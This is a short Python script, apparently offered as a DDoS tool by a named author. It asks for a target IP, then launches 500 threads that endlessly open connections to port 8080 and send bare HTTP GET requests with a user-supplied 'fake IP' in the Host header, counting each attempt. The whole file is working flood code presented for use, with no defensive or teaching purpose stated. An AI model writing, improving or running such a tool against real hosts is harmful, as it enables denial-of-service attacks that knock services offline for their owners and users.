import socket
import threading
import time

G = "\u001b[32m"
C = "\u001b[36m"

print("\u001b[33;1mThis Script is Created By \u001b[34;1mShervin.BDN")
print("\u001b[32;1mMy GitHub {" + "https://github.com/shervin-glitch" + "\u001b[32;1m}\n\r")

time.sleep(2.5)

target = str(input(G + "Enter The Target's IP =>"))
port = 8080
fake_ip = str(input(G + "Enter Your Fake IP Here =>"))
attack_log = 0

def ddos():
    while True:
        s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
        s.connect((target , port))
        s.sendto((f"GET /{target} HTTP/1.1\r\n").encode("ascii") , (target , port))
        s.sendto((f"HOST : {fake_ip}\r\n\r\n").encode("ascii") , (target , port))
        s.close()

        global attack_log
        attack_log += 1
        print(attack_log)

for i in range(500):
    thread = threading.Thread(target = ddos)
    thread.start()